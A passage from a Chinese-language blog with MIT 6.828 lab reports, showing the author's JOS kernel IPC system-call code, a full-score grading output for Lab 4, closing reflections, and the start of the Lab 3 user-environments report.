class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/syscall.c, sys_ipc_recv():</span></span><br><span class="line"><span class="comment">// Block until a value is ready.  Record that you want to receive</span></span><br><span class="line"><span class="comment">// using the env_ipc_recving and env_ipc_dstva fields of struct Env,</span></span><br><span class="line"><span class="comment">// mark yourself not runnable, and then give up the CPU.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If 'dstva' is &lt; UTOP, then you are willing to receive a page of data.</span></span><br><span class="line"><span class="comment">// 'dstva' is the virtual address at which the sent page should be mapped.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function only returns on error, but the system call will eventually</span></span><br><span class="line"><span class="comment">// return 0 on success.</span></span><br><span class="line"><span class="comment">// Return &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_INVAL if dstva &lt; UTOP but dstva is not page-aligned.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_ipc_recv</span><span class="params">(<span class="keyword">void</span> *dstva)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// similar to sys_ipc_try_send, will not mark an error</span></span><br><span class="line">    <span class="comment">// if dstva &gt;= UTOP</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)dstva &lt; UTOP &amp;&amp; PGOFF(dstva) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// if dstva &lt; UTOP but dstva is not page-aligned</span></span><br><span class="line">        <span class="comment">// NB: &amp;&amp; rather than ||, we won't report error</span></span><br><span class="line">        <span class="comment">// when dstva &gt;= UTOP</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mark calling environment as not runnable</span></span><br><span class="line">    curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">    <span class="comment">// update status to mark receiver is willing to receive message</span></span><br><span class="line">    curenv-&gt;env_ipc_recving = <span class="literal">true</span>;</span><br><span class="line">    curenv-&gt;env_ipc_dstva   = dstva;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// give up cpu</span></span><br><span class="line">    sys_yield();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_ipc_recv not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ipc succeeds</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/syscall.c, sys_ipc_try_send():</span></span><br><span class="line"><span class="comment">// Try to send 'value' to the target env 'envid'.</span></span><br><span class="line"><span class="comment">// If srcva &lt; UTOP, then also send page currently mapped at 'srcva',</span></span><br><span class="line"><span class="comment">// so that receiver gets a duplicate mapping of the same page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The send fails with a return value of -E_IPC_NOT_RECV if the</span></span><br><span class="line"><span class="comment">// target is not blocked, waiting for an IPC.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The send also can fail for the other reasons listed below.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Otherwise, the send succeeds, and the target's ipc fields are</span></span><br><span class="line"><span class="comment">// updated as follows:</span></span><br><span class="line"><span class="comment">//    env_ipc_recving is set to 0 to block future sends;</span></span><br><span class="line"><span class="comment">//    env_ipc_from is set to the sending envid;</span></span><br><span class="line"><span class="comment">//    env_ipc_value is set to the 'value' parameter;</span></span><br><span class="line"><span class="comment">//    env_ipc_perm is set to 'perm' if a page was transferred, 0 otherwise.</span></span><br><span class="line"><span class="comment">// The target environment is marked runnable again, returning 0</span></span><br><span class="line"><span class="comment">// from the paused sys_ipc_recv system call.  (Hint: does the</span></span><br><span class="line"><span class="comment">// sys_ipc_recv function ever actually return?)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If the sender wants to send a page but the receiver isn't asking for one,</span></span><br><span class="line"><span class="comment">// then no page mapping is transferred, but no error occurs.</span></span><br><span class="line"><span class="comment">// The ipc only happens when no errors occur.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if environment envid doesn't currently exist.</span></span><br><span class="line"><span class="comment">//      (No need to check permissions.)</span></span><br><span class="line"><span class="comment">//  -E_IPC_NOT_RECV if envid is not currently blocked in sys_ipc_recv,</span></span><br><span class="line"><span class="comment">//      or another environment managed to send first.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if srcva &lt; UTOP but srcva is not page-aligned.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if srcva &lt; UTOP and perm is inappropriate</span></span><br><span class="line"><span class="comment">//      (see sys_page_alloc).</span></span><br><span class="line"><span class="comment">//  -E_INVAL if srcva &lt; UTOP but srcva is not mapped in the caller's</span></span><br><span class="line"><span class="comment">//      address space.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if (perm &amp; PTE_W), but srcva is read-only in the</span></span><br><span class="line"><span class="comment">//      current environment's address space.</span></span><br><span class="line"><span class="comment">//  -E_NO_MEM if there's not enough memory to map srcva in envid's</span></span><br><span class="line"><span class="comment">//      address space.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_ipc_try_send</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">uint32_t</span> value, <span class="keyword">void</span> *srcva,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">unsigned</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// check for existence of env with envid</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (envid2env(envid, &amp;env, <span class="literal">false</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// environment envid doesn't currently exist</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check receiver's status</span></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;env_ipc_recving) &#123;</span><br><span class="line">        <span class="comment">// envid is not currently blocked in sys_ipc_recv</span></span><br><span class="line">        <span class="comment">// or another environment managed to send first</span></span><br><span class="line">        <span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)srcva &lt; UTOP) &#123;</span><br><span class="line">        <span class="comment">// srcva is valid</span></span><br><span class="line">        <span class="comment">// check srcva is page-aligned</span></span><br><span class="line">        <span class="keyword">if</span> (PGOFF(srcva) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// srcva is not page-aligned</span></span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check perm passed in</span></span><br><span class="line">        <span class="keyword">if</span> ((perm &amp; (~PTE_SYSCALL)) || !(perm &amp; PTE_U) || !(perm &amp; PTE_P)) &#123;</span><br><span class="line">            <span class="comment">// invalid perm</span></span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check srcva actually be mapped</span></span><br><span class="line">        <span class="keyword">pte_t</span> *          pgtable_entry;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="keyword">if</span> ((page = page_lookup(curenv-&gt;env_pgdir, srcva, &amp;pgtable_entry)) ==</span><br><span class="line">            <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// NB: check for SRCVA here, so use curenv-&gt;env_pgdir</span></span><br><span class="line">            <span class="comment">// srcva is not mapped at caller's address space</span></span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check PTE_W between sender and receiver</span></span><br><span class="line">        <span class="keyword">if</span> ((perm &amp; PTE_W) &amp;&amp; (!((*pgtable_entry) &amp; PTE_W))) &#123;</span><br><span class="line">            <span class="comment">// if perm has PTE_W while srcva is read-only in</span></span><br><span class="line">            <span class="comment">// current environment's address space</span></span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)(env-&gt;env_ipc_dstva) &lt; UTOP) &#123;</span><br><span class="line">            <span class="comment">// receiver also expects page to be transferred</span></span><br><span class="line">            <span class="comment">// call page_insert to actually transer the page</span></span><br><span class="line">            <span class="keyword">if</span> (page_insert(env-&gt;env_pgdir, page, env-&gt;env_ipc_dstva, perm) &lt;</span><br><span class="line">                <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// out of memory when try to insert page</span></span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// page successfully transferred</span></span><br><span class="line">            env-&gt;env_ipc_perm = perm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// srcva &gt;= UTOP</span></span><br><span class="line">        <span class="comment">// invalid srcva, but we won't return error here</span></span><br><span class="line">        <span class="comment">// ipc_send will panic if we do so</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update receiver's information</span></span><br><span class="line">    env-&gt;env_ipc_recving = <span class="literal">false</span>;</span><br><span class="line">    env-&gt;env_ipc_from    = curenv-&gt;env_id;</span><br><span class="line">    env-&gt;env_ipc_value   = value;</span><br><span class="line">    <span class="comment">// mark receiver to be runnable to match what we do in sys_ipc_recv</span></span><br><span class="line">    env-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">    <span class="comment">// modify trapframe's eax register to `update' return value</span></span><br><span class="line">    env-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_ipc_try_send not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ipc succeeds</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In lib/ipc.c, ipc_recv():</span></span><br><span class="line"><span class="comment">// Receive a value via IPC and return it.</span></span><br><span class="line"><span class="comment">// If 'pg' is nonnull, then any page sent by the sender will be mapped at</span></span><br><span class="line"><span class="comment">//	that address.</span></span><br><span class="line"><span class="comment">// If 'from_env_store' is nonnull, then store the IPC sender's envid in</span></span><br><span class="line"><span class="comment">//	*from_env_store.</span></span><br><span class="line"><span class="comment">// If 'perm_store' is nonnull, then store the IPC sender's page permission</span></span><br><span class="line"><span class="comment">//	in *perm_store (this is nonzero if a page was successfully</span></span><br><span class="line"><span class="comment">//	transferred to 'pg').</span></span><br><span class="line"><span class="comment">// If the system call fails, then store 0 in *fromenv and *perm (if</span></span><br><span class="line"><span class="comment">//	they're nonnull) and return the error.</span></span><br><span class="line"><span class="comment">// Otherwise, return the value sent by the sender</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use 'thisenv' to discover the value and who sent it.</span></span><br><span class="line"><span class="comment">//   If 'pg' is null, pass sys_ipc_recv a value that it will understand</span></span><br><span class="line"><span class="comment">//   as meaning "no page".  (Zero is not the right value, since that's</span></span><br><span class="line"><span class="comment">//   a perfectly valid place to map a page.)</span></span><br><span class="line"><span class="keyword">int32_t</span> ipc_recv(<span class="keyword">envid_t</span> *from_env_store, <span class="keyword">void</span> *pg, <span class="keyword">int</span> *perm_store) &#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// check pg, if pg is null, then should set it to UTOP,</span></span><br><span class="line">    <span class="comment">// for only if dstva is below UTOP, sender knows that</span></span><br><span class="line">    <span class="comment">// receiver wants a page to be transferred</span></span><br><span class="line">    <span class="keyword">if</span> (!pg) &#123; pg = (<span class="keyword">void</span> *)UTOP; &#125;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">if</span> ((r = sys_ipc_recv(pg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// system call fails</span></span><br><span class="line">        <span class="comment">// store from env and perm if corresponding pointer is not null</span></span><br><span class="line">        <span class="keyword">if</span> (from_env_store) &#123; *from_env_store = <span class="number">0</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (perm_store) &#123; *perm_store = <span class="number">0</span>; &#125;</span><br><span class="line">        <span class="comment">// return the error</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// system call succeeds</span></span><br><span class="line">    <span class="comment">// extract information from thisenv's IPC fields</span></span><br><span class="line">    <span class="keyword">if</span> (from_env_store) &#123;</span><br><span class="line">        <span class="comment">// store IPC sender's envid into *from_env_store</span></span><br><span class="line">        *from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (perm_store) &#123;</span><br><span class="line">        <span class="comment">// store IPC sender's page permission</span></span><br><span class="line">        *perm_store = thisenv-&gt;env_ipc_perm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("ipc_recv not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the value send by the sender</span></span><br><span class="line">    <span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/syscall.c, syscall():</span></span><br><span class="line"><span class="comment">// new code added</span></span><br><span class="line"><span class="keyword">case</span> SYS_ipc_recv:</span><br><span class="line">    <span class="comment">// call sys_ipc_recv</span></span><br><span class="line">    <span class="keyword">return</span> sys_ipc_recv((<span class="keyword">void</span> *)a1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_ipc_try_send:</span><br><span class="line">    <span class="comment">// call sys_ipc_try_send</span></span><br><span class="line">    <span class="keyword">return</span> sys_ipc_try_send((<span class="keyword">envid_t</span>)a1, (<span class="keyword">uint32_t</span>)a2, (<span class="keyword">void</span> *)a3,</span><br><span class="line">                            (<span class="keyword">unsigned</span>)a4);</span><br><span class="line"></span><br><span class="line"><span class="comment">// In lib/ipc.c, ipc_send():</span></span><br><span class="line"><span class="comment">// Send 'val' (and 'pg' with 'perm', if 'pg' is nonnull) to 'toenv'.</span></span><br><span class="line"><span class="comment">// This function keeps trying until it succeeds.</span></span><br><span class="line"><span class="comment">// It should panic() on any error other than -E_IPC_NOT_RECV.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use sys_yield() to be CPU-friendly.</span></span><br><span class="line"><span class="comment">//   If 'pg' is null, pass sys_ipc_try_send a value that it will understand</span></span><br><span class="line"><span class="comment">//   as meaning "no page".  (Zero is not the right value.)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ipc_send</span><span class="params">(<span class="keyword">envid_t</span> to_env, <span class="keyword">uint32_t</span> val, <span class="keyword">void</span> *pg, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// check pg, if pg is null, then should set it to UTOP(invalid value</span></span><br><span class="line">    <span class="comment">// but won't result in panic)</span></span><br><span class="line">    <span class="keyword">if</span> (!pg) &#123; pg = (<span class="keyword">void</span> *)UTOP; &#125;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// keeps trying until succeeds or panic</span></span><br><span class="line">        r = sys_ipc_try_send(to_env, val, pg, perm);</span><br><span class="line">        <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// message successfully sent, return</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (r != -E_IPC_NOT_RECV) &#123;</span><br><span class="line">            <span class="comment">// error when sending, should panic</span></span><br><span class="line">            panic(<span class="string">"failed to send messages - %e!"</span>, r);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// use sys_yield to avoid waste on CPU</span></span><br><span class="line">        sys_yield();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("ipc_send not implemented");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>最终执行<code>make grade</code>，评分脚本的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">dumbfork:</span><br><span class="line">$ make run-dumbfork-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.6s)</span><br><span class="line">Part A score: 5/5</span><br><span class="line">faultread:</span><br><span class="line">$ make run-faultread-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">faultwrite:</span><br><span class="line">$ make run-faultwrite-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">faultdie:</span><br><span class="line">$ make run-faultdie-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">faultregs:</span><br><span class="line">$ make run-faultregs-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.1s)</span><br><span class="line">faultalloc:</span><br><span class="line">$ make run-faultalloc-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (4.6s)</span><br><span class="line">faultallocbad:</span><br><span class="line">$ make run-faultallocbad-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.3s)</span><br><span class="line">faultnostack:</span><br><span class="line">$ make run-faultnostack-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.8s)</span><br><span class="line">faultbadhandler:</span><br><span class="line">$ make run-faultbadhandler-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.2s)</span><br><span class="line">faultevilhandler:</span><br><span class="line">$ make run-faultevilhandler-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">forktree:</span><br><span class="line">$ make run-forktree-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.4s)</span><br><span class="line">Part B score: 50/50</span><br><span class="line">spin:</span><br><span class="line">$ make run-spin-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (0.7s)</span><br><span class="line">stresssched:</span><br><span class="line">$ make run-stresssched-nox-gdb CPUS=4 QEMUEXTRA+=-snapshot</span><br><span class="line">OK (3.0s)</span><br><span class="line">sendpage:</span><br><span class="line">$ make run-sendpage-nox-gdb CPUS=2 QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.7s)</span><br><span class="line">pingpong:</span><br><span class="line">$ make run-pingpong-nox-gdb CPUS=4 QEMUEXTRA+=-snapshot</span><br><span class="line">OK (2.1s)</span><br><span class="line">primes:</span><br><span class="line">$ make run-primes-nox-gdb CPUS=4 QEMUEXTRA+=-snapshot</span><br><span class="line">OK (4.5s)</span><br><span class="line">Part C score: 25/25</span><br><span class="line">Score: 80/80</span><br></pre></td></tr></table></figure><br>至此，实验四结束。</p>
<p>第四个实验是第一到第四个实验中难度最大、代码量最多的一个实验，在前三个实验中任何的代码错误（尽管可能在当时的实验评分中没有反映出来）都会导致实验四出现难以调试的错误。</p>
<p>实验四中每个练习遇到的问题我都已经在报告中总结，此外，也在代码中以NB标明。其中大部分都是一些小错误，还有少部分是没有将问题考虑全面导致的。尽管如此，几乎每一个错误我都花费了至少几十分钟去调试。</p>
<p>操作系统的调试不仅仅困难（Triple Fault会导致不打补丁的qemu重启），任何一个小错误都会导致系统崩溃。现代操作系统如Linux的鲁棒性可见一斑。</p>
<p>本学期的事情比起上学期只增不减，加上课程设计只要求完成四个实验，实验四结束后，MIT-6.828系列就告一段落了。</p>
<p>希望我的这四篇实验报告能对正在写实验的你产生些许的启发，也欢迎找我交流相关的问题。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2018/02/26/MIT6-828操作系统工程Lab4-Preemptive-Multitasking实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2018/02/23/MIT6-828操作系统工程Lab3-User-Environments实验报告/">
                            MIT6.828操作系统工程Lab3-User Environments实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2018-02-23T19:12:13+08:00">
	
		    2月 23, 2018
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/操作系统/">操作系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>Lab3 - User Environments需要实现基本的内核功能，使得一个受保护的用户环境（进程）可以运行。在本实验中，需要让内核设置数据结构以追踪用户环境，创建一个单用户环境，加载程序镜像并执行。此外，内核还需要能处理用户环境的系统调用以及引发的异常。<br>2018年2月26日，完成了实验并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>根据官网，切换到分支lab3并且合并分支lab2。在合并的过程中，发生了冲突。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user% git checkout -b lab3 origin/lab3</span><br><span class="line">user% git merge lab2</span><br></pre></td></tr></table></figure>
<p>根据提示，是<code>kern/monitor.c</code>中发生了冲突，因为仅有一处冲突，手动编辑<code>kern/monitor.c</code>文件，并commit，即可解决冲突并合并分支。</p>
<p>实验三包括如下的新文件：</p>
<ul>
<li>inc/env.h 用户模式环境的公有定义</li>
<li>inc/trap.h 陷阱处理的公有定义</li>
<li>inc/syscall.h 用户环境对内核的系统调用的公有定义</li>
<li>inc/lib.h 用户模式支持的库公有定义</li>
<li>kern/env.h 用户模式环境的内核私有定义</li>
<li>kern/env.c 用户模式环境的内核代码实现</li>
<li>kern/trap.h 内核私有的陷阱处理定义</li>
<li>kern/trap.c 陷阱处理代码</li>
<li>kern/trapentry.S 汇编语言的陷阱处理程序入口</li>
<li>kern/syscall.h 系统调用处理的内核私有定义</li>
<li>kern/syscall.c 系统调用实现代码</li>
<li>lib/Makefrag 用户模式库obj/lib/libjos.a的Makefile</li>
<li>lib/entry.S 用户环境的汇编语言入口</li>
<li>lib/libmain.c entry.S调用的用户模式库安装代码</li>
<li>lib/syscall.c 用户模式系统调用的打桩函数</li>
<li>lib/console.c 用户模式的putchar和getchar实现，提供了控制台IO</li>
<li>lib/exit.c 用户模式的exit实现</li>
<li>lib/panic.c 用户模式的panic实现</li>
<li>user/* 检验内核实验三代码的测试程序</li>
</ul>
<p>此外，lab2中的一些文件在lab3中也被添加了新的内容，可以用<code>git diff lab2</code>查看具体的比较信息。</p>
<h4 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h4><p>本实验中可能会用到<code>GCC</code>的内联汇编特性，应当至少理解给出的代码中的内联汇编代码片段。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-User-Environments-and-Exception-Handling-用户环境和错误处理"><a href="#第一部分-User-Environments-and-Exception-Handling-用户环境和错误处理" class="headerlink" title="第一部分 User Environments and Exception Handling - 用户环境和错误处理"></a>第一部分 User Environments and Exception Handling - 用户环境和错误处理</h3><p><code>inc/env.h</code>中给出了用户环境的基本定义。内核通过<code>struct Env</code>追踪每一个用户环境。本实验中只需要创建一个环境，然而你需要设计JOS内核实际支持多用户环境。实验四中，你将通过允许一个用户环境<code>fork</code>别的用户环境来利用多用户环境的特性。</p>
<p><code>kern/env.c</code>中可以看到，内核管理3个与环境有关的全局变量：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *       <span class="title">envs</span>   = <span class="title">NULL</span>;</span>    <span class="comment">// All environments</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *       <span class="title">curenv</span> = <span class="title">NULL</span>;</span>    <span class="comment">// The current env</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_free_list</span>;</span>    <span class="comment">// Free environment list</span></span><br></pre></td></tr></table></figure></p>
